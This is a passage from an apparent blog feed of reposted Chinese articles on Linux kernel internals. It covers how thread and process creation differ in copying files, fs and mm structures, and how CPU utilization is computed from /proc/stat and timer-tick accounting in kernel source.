alt="img"></p><p>对于创建进程来讲，没有传入这个标志，就会新创建一个 files 成员出来。</p><p><img src="https://pic1.zhimg.com/80/v2-92985b8fb3c1fe60fb11f090394cd3e4_1440w.webp" alt="img"></p><p>好了，我们继续看 copy_files 具体实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">copy_files</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags, <span class="hljs-keyword">struct</span> task_struct *tsk)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> *<span class="hljs-title">oldf</span>, *<span class="hljs-title">newf</span>;</span><br> oldf = current-&gt;files;<br><br> <span class="hljs-keyword">if</span> (clone_flags &amp; CLONE_FILES) &#123;<br>  <span class="hljs-type">atomic_inc</span>(&amp;oldf-&gt;count);<br>  <span class="hljs-keyword">goto</span> out;<br> &#125;<br> newf = dup_fd(oldf, &amp;error);<br> tsk-&gt;files = newf;<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>从代码看出，如果指定了 CLONE_FILES（创建线程的时候），只是在原有的 files_struct 里面 +1 就算是完事了，指针不变，仍然是复用创建它的进程的 files_struct 对象。</p><p><strong>这就是进程和线程的其中一个区别，对于进程来讲，每一个进程都需要独立的 files_struct。但是对于线程来讲，它是和创建它的线程复用 files_struct 的。</strong></p><h3 id="5-3-拷贝文件目录信息"><a href="#5-3-拷贝文件目录信息" class="headerlink" title="5.3 拷贝文件目录信息"></a><strong>5.3 拷贝文件目录信息</strong></h3><p>再回忆一下创建线程的时候，传入的 flag 里也包括 CLONE_FS。如果指定了这个标志，就会复用当前进程的文件目录 - fs 成员。</p><p><img src="https://pic4.zhimg.com/80/v2-2e2056816b8f9b1fb45b3d852f78d49f_1440w.webp" alt="img"></p><p>对于创建进程来讲，没有传入这个标志，就会新创建一个 fs 出来。</p><p><img src="https://pic1.zhimg.com/80/v2-74d9838c06cf1b581ff81f15a0900054_1440w.webp" alt="img"></p><p>好，我们继续看 copy_fs 的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">copy_fs</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags, <span class="hljs-keyword">struct</span> task_struct *tsk)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fs_struct</span> *<span class="hljs-title">fs</span> =</span> current-&gt;fs;<br> <span class="hljs-keyword">if</span> (clone_flags &amp; CLONE_FS) &#123;<br>  fs-&gt;users++;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br> tsk-&gt;fs = copy_fs_struct(fs);<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>和 copy_files 函数类似，在 copy_fs 中如果指定了 CLONE_FS（创建线程的时候），并没有真正申请独立的 fs_struct 出来，近几年只是在原有的 fs 里的 users +1 就算是完事。</p><p>而在创建进程的时候，由于没有传递这个标志，会进入到 copy_fs_struct 函数中申请新的 fs_struct 并进行赋值拷贝。</p><h3 id="5-4-拷贝内存地址空间"><a href="#5-4-拷贝内存地址空间" class="headerlink" title="5.4 拷贝内存地址空间"></a><strong>5.4 拷贝内存地址空间</strong></h3><p>创建线程的时候带了 CLONE_VM 标志，而创建进程的时候没带。接下来在 copy_mm 函数 中会根据是否有这个标志来决定是该和当前线程共享一份地址空间 mm_struct，还是创建一份新的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/fork.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">copy_mm</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags, <span class="hljs-keyword">struct</span> task_struct *tsk)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>, *<span class="hljs-title">oldmm</span>;</span><br> oldmm = current-&gt;mm;<br><br> <span class="hljs-keyword">if</span> (clone_flags &amp; CLONE_VM) &#123;<br>  <span class="hljs-type">atomic_inc</span>(&amp;oldmm-&gt;mm_users);<br>  mm = oldmm;<br>  <span class="hljs-keyword">goto</span> good_mm;<br> &#125;<br> mm = dup_mm(tsk);<br>good_mm:<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></td></tr></table></figure><p>对于线程来讲，由于传入了 CLONE_VM 标记，所以不会申请新的 mm_struct 出来，而是共享其父进程的。</p><p><img src="https://pic3.zhimg.com/80/v2-3671711746646b8459112d85d6f8844e_1440w.webp" alt="img"></p><p>多线程程序中的所有线程都会共享其父进程的地址空间。</p><p><img src="https://pic4.zhimg.com/80/v2-e8d1c091cef112d142a6fd7b106945ab_1440w.webp" alt="img"></p><p>而对于多进程程序来说，每一个进程都有独立的 mm_struct(地址空间)。</p><p><img src="https://pic4.zhimg.com/80/v2-212e6ce83cf53c5520c7f7d04eab53af_1440w.webp" alt="img"></p><p>因为在内核中线程和进程都是用 task_struct 来表示，只不过线程和进程的区别是会和创建它的父进程共享打开文件列表、目录信息、虚拟地址空间等数据结构，会更轻量一些。所以在 Linux 下的线程也叫<strong>轻量级进程</strong>。</p><p>在打开文件列表、目录信息、内存虚拟地址空间中，内存虚拟地址空间是最重要的。因此区分一个 Task 任务该叫线程还是该叫进程，一般习惯上就看它是否有独立的地址空间。如果有，就叫做进程，没有，就叫做线程。</p><p>这里展开多说一句，对于内核任务来说，无论有多少个任务，其使用地址空间都是同一个。所以一般都叫内核线程，而不是内核进程。</p><h2 id="六、-结论"><a href="#六、-结论" class="headerlink" title="六、 结论"></a><strong>六、 结论</strong></h2><p>创建线程的整个过程我们就介绍完了。回头总结一下，对于线程来讲，其地址空间 mm_struct、目录信息 fs_struct、打开文件列表 files_struct 都是和创建它的任务共享的。</p><p><img src="https://pic2.zhimg.com/80/v2-167941fd17dbe4319e55186356a7f8f1_1440w.webp" alt="img"></p><p>但是对于进程来讲，地址空间 mm_struct、挂载点 fs_struct、打开文件列表 files_struct 都要是独立拥有的，都需要去申请内存并初始化它们。</p><p><img src="https://pic3.zhimg.com/80/v2-7fcdcf56a7246158d3d05f67dae79e46_1440w.webp" alt="img"></p><p>总之，在 Linux 内核中并没有对线程做特殊处理，还是由 task_struct 来管理。从内核的角度看，线程本质上还是一个进程。只不过和普通进程比，稍微“轻量”了那么一些。</p>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的CPU 利用率是怎么算出来的？</title>
    <link href="/2023/03/18/%E5%88%A9%E7%94%A8%E7%8E%87%E6%98%AF%E6%80%8E%E4%B9%88%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F/"/>
    <url>/2023/03/18/%E5%88%A9%E7%94%A8%E7%8E%87%E6%98%AF%E6%80%8E%E4%B9%88%E7%AE%97%E5%87%BA%E6%9D%A5%E7%9A%84%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="Linux中的CPU-利用率是怎么算出来的？"><a href="#Linux中的CPU-利用率是怎么算出来的？" class="headerlink" title="Linux中的CPU 利用率是怎么算出来的？"></a>Linux中的CPU 利用率是怎么算出来的？</h1><blockquote><p>转载自张彦飞的<a href="https://zhuanlan.zhihu.com/p/613778078">Linux中的CPU 利用率是怎么算出来的？</a></p></blockquote><p><strong>CPU 使用率的计算方法</strong></p><p><img src="https://pic1.zhimg.com/80/v2-d82fcdacd02c6b18d62925b8c4189a08_1440w.webp" alt="img"></p><p><img src="https://pic1.zhimg.com/80/v2-bc787a0eeaa24f03215f24ef7ecdb078_1440w.webp" alt="img"></p><p><strong>怎么查看 CPU 使用率</strong></p><p>要查看 CPU 使用率，就必须先读取*&#x2F;proc&#x2F;stat<em>和</em>&#x2F;proc&#x2F;[pid]&#x2F;stat*这两个文件，然后再按照上面的公式计算。但现在各种各样的性能分析工具已经帮我们计算好了。</p><p><strong>top</strong></p><p><code>top</code>显示了系统总体的 CPU 和内存使用情况，以及各个进程的资源使用情况。top 默认显示的是所有 CPU 的平均值，这个时候你只需要按下数字 <strong>1</strong> ，就可以切换到每个 CPU的使用率了</p><p>CPU利用率.【top】{他是一个时间百分比，一般的监控是cpu利用的总和，并不能分析是有效利用还是无效利用，要去服务器上看是不是us和sy高}</p><p><strong>ps</strong></p><p><code>ps</code> 则只显示了每个进程的资源使用情况。</p><p><strong>pidstat</strong></p><p><code>pidstat</code> 每个进程的详细情况，</p><ul><li>用户态 CPU 使用率 （%usr）；</li><li>内核态 CPU 使用率（%system）；</li><li>运行虚拟机 CPU 使用率（%guest）；</li><li>等待 CPU 使用率（%wait）；</li><li>以及总的 CPU 使用率（%CPU）。</li></ul><p>在线上服务器观察线上服务运行状态的时候，绝大多数人都是喜欢先用 top 命令看看当前系统的整体 cpu 利用率。例如，随手拿来的一台机器，top 命令按1后显示的利用率信息如下</p><p><img src="https://s2.51cto.com/images/blog/202204/13002055_6255a6e74e86919445.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp/resize,m_fixed,w_1184" alt="CPU性能分析和指标_时间片_04"></p><p><strong>PID这一行的%CPU是逻辑和的利用率，双核可以达到200%，4核的话可以到400%</strong></p><ol><li><strong>user（通常缩写为 us）</strong>，代表用户态 CPU 时间。注意，它不包括下面的 nice 时间，但包括了 guest 时间。</li><li><strong>nice（通常缩写为 ni）</strong>，代表低优先级用户态 CPU 时间，也就是进程的 nice 值被调整为 1-19 之间时的 CPU 时间。这里注意，nice 可取值范围是 -20 到 19，数值越大，优先级反而越低。</li><li><strong>system（通常缩写为 sys）</strong>， 代表内核态 CPU 时间。</li><li><strong>idle（通常缩写为 id）</strong>，代表空闲时间。注意，它不包括等待 I&#x2F;O 的时间（iowait）。</li><li><strong>iowait（通常缩写为 wa）</strong>，代表等待 I&#x2F;O 的 CPU 时间。</li><li><strong>irq（通常缩写为 hi）</strong>，代表处理硬中断的 CPU 时间。</li><li><strong>softirq（通常缩写为 si）</strong>，代表处理软中断的 CPU 时间。</li><li><strong>steal（通常缩写为 st）</strong>，代表当系统运行在虚拟机中的时候，被其他虚拟机占用的CPU 时间。</li><li><strong>guest（通常缩写为 guest）</strong>，代表通过虚拟化运行其他操作系统的时间，也就是运行虚拟机的 CPU 时间。</li><li><strong>guest_nice（通常缩写为 gnice）</strong>，代表以低优先级运行虚拟机的时间。</li></ol><p>这个输出结果说简单也简单，说复杂也不是那么容易就能全部搞明白的。例如：</p><p>问题 1：top 输出的利用率信息是如何计算出来的，它精确吗？<br>问题 2：ni 这一列是 nice，它输出的是 cpu 在处理啥时的开销？<br>问题 3：wa 代表的是 io wait，那么这段时间中 cpu 到底是忙碌还是空闲？</p><p>今天我们对 cpu 利用率统计进行深入的学习。通过今天的学习，你不但能了解 cpu 利用率统计实现细节，还能 nice、io wait 等指标有更深入的理解。</p><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a><strong>一、前言</strong></h2><p>抛开 Linux 的实现先不谈，如果有如下需求，有一个四核服务器，上面跑了四个进程。</p><p><img src="https://pic2.zhimg.com/80/v2-827f1ce52a88acc42ba9033c388ae099_1440w.webp" alt="img"></p><p>让你来设计计算整个系统 cpu 利用率的这个需求，支持像 top 命令这样的输出，满足以下要求：</p><ul><li>cpu 使用率要尽可能地准确</li><li>要能地体现秒级瞬时 cpu 状态</li></ul><p>其中一个思路是把所有进程的执行时间都加起来，然后再除以系统执行总时间*4。</p><p><img src="https://pic4.zhimg.com/80/v2-8bcb13df99cde38f2161c01d6e979a0f_1440w.webp" alt="img"></p><p>这个思路是没问题的，用这种方法统计很长一段时间内的 cpu 利用率是可以的，统计也足够的准确。</p><p>但只要用过 top 你就知道 top 输出的 cpu 利用率并不是长时间不变的，而是默认 3 秒为单位会动态更新一下（这个时间间隔可以使用 -d 设置）。我们的这个方案体现总利用率可以，体现这种瞬时的状态就难办了。你可能会想到那我也 3 秒算一次不就行了？但这个 3 秒的时间从哪个点开始呢。粒度很不好控制。</p><p>上一个思路问题核心就是如何解决瞬时问题。提到瞬时状态，你可能就又来思路了。那我就用瞬时采样去看，看看当前有几个核在忙。四个核中如果有两个核在忙，那利用率就是 50%。</p><p>这个思路思考的方向也是正确的，但是问题有两个：</p><ul><li>你算出的数字都是 25% 的整数倍</li><li>这个瞬时值会导致 cpu 使用率显示的剧烈震荡。</li></ul><p>比如下图：</p><p><img src="https://pic3.zhimg.com/80/v2-7a611066e3769798e0267bf7c654b902_1440w.webp" alt="img"></p><p>在 t1 的瞬时状态看来，系统的 cpu 利用率毫无疑问就是 100%，但在 t2 时间看来，使用率又变成 0% 了。思路方向是对的，但显然这种粗暴的计算无法像 top 命令一样优雅地工作。</p><p>我们再改进一下它，把上面两个思路结合起来，可能就能解决我们的问题了。在采样上，我们把周期定的细一些，但在计算上我们把周期定的粗一些。</p><p>我们引入采用周期的概念，定时比如每 1 毫秒采样一次。如果采样的瞬时，cpu 在运行，就将这 1 ms 记录为使用。这时会得出一个瞬时的 cpu 使用率，把它都存起来。</p><p><img src="https://pic1.zhimg.com/80/v2-f4ff1456a5b5b142392a4864aaf3a9dc_1440w.webp" alt="img"></p><p>在统计 3 秒内的 cpu 使用率的时候，比如上图中的 t1 和 t2 这段时间范围。那就把这段时间内的所有瞬时值全加一下，取个平均值。这样就能解决上面的问题了，统计相对准确，避免了瞬时值剧烈震荡且粒度过粗（只能以 25 %为单位变化）的问题了。</p><p>可能有同学会问了，假如 cpu 在两次采样中间发生变化了呢，如下图这种情况。</p><p><img src="https://pic1.zhimg.com/80/v2-62433fb2cb7e2cdeea9d64f274a3f94c_1440w.webp" alt="img"></p><p>在当前采样点到来的时候，进程 A 其实刚执行完，有一点点时间没有既没被上一个采样点统计到，本次也统计不到。对于进程 B，其实只开始了一小段时间，把 1 ms 全记上似乎有点多记了。</p><p>确实会存在这个问题，但因为我们的采样是 1 ms 一次，而我们实际查看使用的时候最少也有是秒级别地用，会包括有成千上万个采样点的信息。另外就是现代的服务器往往都都上百个逻辑核，数量多也一定程度上会抹平误差。所以这种抽样统计的方法虽然存在不精确，但并不会影响我们对全局的把握。</p><p>事实上，Linux 也就是这样来统计系统 cpu 利用率的。虽然可能会有误差，但作为一项统计数据使用已经是足够了的。在实现上，Linux 是将所有的瞬时值都累加到某一个数据上的，而不是真的存了很多份的瞬时数据。</p><p>接下来就让我们进入 Linux 来查看它对系统 cpu 利用率统计的具体实现。</p><h2 id="二、top-命令使用数据在哪儿"><a href="#二、top-命令使用数据在哪儿" class="headerlink" title="二、top 命令使用数据在哪儿"></a><strong>二、top 命令使用数据在哪儿</strong></h2><p>上一节我们说的 Linux 在实现上是将瞬时值都累加到某一个数据上的，这个值是内核通过 &#x2F;proc&#x2F;stat 伪文件来对用户态暴露。Linux 在计算系统 cpu 利用率的时候用的就是它。</p><p>整体上看，top 命令工作的内部细节如下图所示。</p><p><img src="https://pic1.zhimg.com/80/v2-55f62d7f160162a94d5a2acf394715a8_1440w.webp" alt="img"></p><ul><li>top 命令访问 &#x2F;proc&#x2F;stat 获取各项 cpu 利用率使用值</li><li>内核调用 stat_open 函数来处理对 &#x2F;proc&#x2F;stat 的访问</li><li>内核访问的数据来源于 kernel_cpustat 数组，并汇总</li><li>打印输出给用户态</li></ul><p>接下来我们把每一步都展开来详细看看。</p><p>通过使用 strace 跟踪 top 命令的各种系统调用，可以看的到它对该文件的调用。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># strace top</span><br>...<br>openat(AT_FDCWD, <span class="hljs-string">&quot;/proc/stat&quot;</span>, O_RDONLY) = 4<br>openat(AT_FDCWD, <span class="hljs-string">&quot;/proc/2351514/stat&quot;</span>, O_RDONLY) = 8<br>openat(AT_FDCWD, <span class="hljs-string">&quot;/proc/2393539/stat&quot;</span>, O_RDONLY) = 8<br>...<br></code></pre></td></tr></table></figure><blockquote><p>除了 &#x2F;proc&#x2F;stat 外，还有各个进程细分的 &#x2F;proc&#x2F;{pid}&#x2F;stat，是用来计算各个进程的 cpu 利用率时使用的。</p></blockquote><p>内核为各个伪文件都定义了处理函数，&#x2F;proc&#x2F;stat 文件的处理方法是 proc_stat_operations。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:fs/proc/stat.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">proc_stat_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br> proc_create(<span class="hljs-string">&quot;stat&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, &amp;proc_stat_operations);<br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">proc_stat_operations</span> =</span> &#123;<br> .open  = stat_open,<br> ...<br>&#125;;<br></code></pre></td></tr></table></figure><p>proc_stat_operations 中包含了该文件时对应的操作方法。当打开 &#x2F;proc&#x2F;stat 文件的时候，stat_open 就会被调用到。stat_open 依次调用 single_open_size，show_stat 来输出数据内容。我们来看看它的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:fs/proc/stat.c</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show_stat</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *p, <span class="hljs-type">void</span> *v)</span><br>&#123;<br> u64 user, nice, system, idle, iowait, irq, softirq, steal;<br><br> for_each_possible_cpu(i) &#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kernel_cpustat</span> *<span class="hljs-title">kcs</span> =</span> &amp;kcpustat_cpu(i);<br><br>  user += kcs-&gt;cpustat[CPUTIME_USER];<br>  nice += kcs-&gt;cpustat[CPUTIME_NICE];<br>  system += kcs-&gt;cpustat[CPUTIME_SYSTEM];<br>  idle += get_idle_time(kcs, i);<br>  iowait += get_iowait_time(kcs, i);<br>  irq += kcs-&gt;cpustat[CPUTIME_IRQ];<br>  softirq += kcs-&gt;cpustat[CPUTIME_SOFTIRQ];<br>  ...<br> &#125;<br><br> <span class="hljs-comment">//转换成节拍数并打印出来</span><br> seq_put_decimal_ull(p, <span class="hljs-string">&quot;cpu  &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(user));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(nice));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(system));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(idle));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(iowait));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(irq));<br> seq_put_decimal_ull(p, <span class="hljs-string">&quot; &quot;</span>, <span class="hljs-type">nsec_to_clock_t</span>(softirq));<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>在上面的代码中，for_each_possible_cpu 是在遍历存储着 cpu 使用率数据的 kcpustat_cpu 变量。该变量是一个 percpu 变量，它为每一个逻辑核都准备了一个数组元素。里面存储着当前核所对应各种事件，包括 user、nice、system、idel、iowait、irq、softirq 等。</p><p>在这个循环中，将每一个核的每种使用率都加起来。最后通过 seq_put_decimal_ull 将这些数据输出出来。</p><p><img src="https://pic3.zhimg.com/80/v2-9195dcf5575102f1e7653b5dd3f05b2a_1440w.webp" alt="img"></p><p>注意，在内核中实际每个时间记录的是纳秒数，但是在输出的时候统一都转化成了节拍单位。至于节拍单位多长，下一节我们介绍。总之， &#x2F;proc&#x2F;stat 的输出是从 kernel_cpustat 这个 percpu 变量中读取出来的。</p><p>我们接着再看看这个变量中的数据是何时加进来的。</p><h2 id="三、统计数据怎么来的"><a href="#三、统计数据怎么来的" class="headerlink" title="三、统计数据怎么来的"></a><strong>三、统计数据怎么来的</strong></h2><p>前面我们提到内核是以采样的方式来统计 cpu 使用率的。这个采样周期依赖的是 Linux 时间子系统中的定时器。</p><p>Linux 内核每隔固定周期会发出 timer interrupt (IRQ 0)，这有点像乐谱中的节拍的概念。每隔一段时间，就打出一个拍子，Linux 就响应之并处理一些事情。</p><p><img src="https://pic3.zhimg.com/80/v2-fdbd361ebd95c06cab9a66497065ac0a_1440w.webp" alt="img"></p><p>一个节拍的长度是多长时间，是通过 CONFIG_HZ 来定义的。它定义的方式是每一秒有几次 timer interrupts。不同的系统中这个节拍的大小可能不同，通常在 1 ms 到 10 ms 之间。可以在自己的 Linux config 文件中找到它的配置。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># grep ^CONFIG_HZ /boot/config-5.4.56.bsk.10-amd64</span><br>CONFIG_HZ=1000<br></code></pre></td></tr></table></figure><p>从上述结果中可以看出，我的机器的每秒要打出 1000 次节拍。也就是每 1 ms 一次。</p><p>每次当时间中断到来的时候，都会调用 update_process_times 来更新系统时间。更新后的时间都存储在我们前面提到的 percpu 变量 kcpustat_cpu 中。</p><p><img src="https://pic2.zhimg.com/80/v2-ac82c39c60831285547ea0ecec8dca4d_1440w.webp" alt="img"></p><p>我们来详细看下汇总过程 update_process_times 的源码，它位于 kernel&#x2F;time&#x2F;timer.c 文件中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/time/timer.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">update_process_times</span><span class="hljs-params">(<span class="hljs-type">int</span> user_tick)</span><br>&#123;<br> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> *<span class="hljs-title">p</span> =</span> current;<br><br> <span class="hljs-comment">//进行时间累积处理</span><br> account_process_tick(p, user_tick);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数的参数 user_tick 值得是采样的瞬间是处于内核态还是用户态。接下来调用 account_process_tick。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">account_process_tick</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> user_tick)</span><br>&#123;<br> cputime = TICK_NSEC;<br> ...<br><br> <span class="hljs-keyword">if</span> (user_tick)<br>  <span class="hljs-comment">//3.1 统计用户态时间</span><br>  account_user_time(p, cputime);<br> <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((p != rq-&gt;idle) || (irq_count() != HARDIRQ_OFFSET))<br>  <span class="hljs-comment">//3.2 统计内核态时间</span><br>  account_system_time(p, HARDIRQ_OFFSET, cputime);<br> <span class="hljs-keyword">else</span><br>  <span class="hljs-comment">//3.3 统计空闲时间</span><br>  account_idle_time(cputime);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数中，首先设置 <code>cputime = TICK_NSEC</code>, 一个 TICK_NSEC 的定义是一个节拍所占的纳秒数。接下来根据判断结果分别执行 account_user_time、account_system_time 和 account_idle_time 来统计用户态、内核态和空闲时间。</p><h3 id="3-1-用户态时间统计"><a href="#3-1-用户态时间统计" class="headerlink" title="3.1 用户态时间统计"></a><strong>3.1 用户态时间统计</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">account_user_time</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, u64 cputime)</span><br>&#123;<br> <span class="hljs-comment">//分两种种情况统计用户态 CPU 的使用情况</span><br> <span class="hljs-type">int</span> index;<br> index = (task_nice(p) &gt; <span class="hljs-number">0</span>) ? CPUTIME_NICE : CPUTIME_USER;<br><br> <span class="hljs-comment">//将时间累积到 /proc/stat 中</span><br> task_group_account_field(p, index, cputime);<br> ......<br>&#125;<br></code></pre></td></tr></table></figure><p>account_user_time 函数主要分两种情况统计：</p><ul><li>如果进程的 nice 值大于 0，那么将会增加到 CPU 统计结构的 nice 字段中。</li><li>如果进程的 nice 值小于等于 0，那么增加到 CPU 统计结构的 user 字段中。</li></ul><p>看到这里，开篇的问题 2 就有答案了，其实用户态的时间不只是 user 字段，nice 也是。之所以要把 nice 分出来，是为了让 Linux 用户更一目了然地看到调过 nice 的进程所占的 cpu 周期有多少。</p><p>我们平时如果想要观察系统的用户态消耗的时间的话，应该是将 top 中输出的 user 和 nice 加起来一并考虑，而不是只看 user！</p><p>接着调用 task_group_account_field 来把时间加到前面我们用到的 kernel_cpustat 内核变量中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//file:kernel/sched/cputime.c</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">task_group_account_field</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">int</span> index,</span><br><span class="hljs-params">      u64 tmp)</span><br>&#123;<br> __this_cpu_add(kernel_cpustat.cpustat[index], tmp);<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-2-内核态时间统计"><a href="#3-2-内核态时间统计" class="headerlink" title="3.2 内核态时间统计"></a><strong>3.2 内核态时间统计</strong></h3><p>我们再来看内核态时间是如何统计的，找到 account_system_time 的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 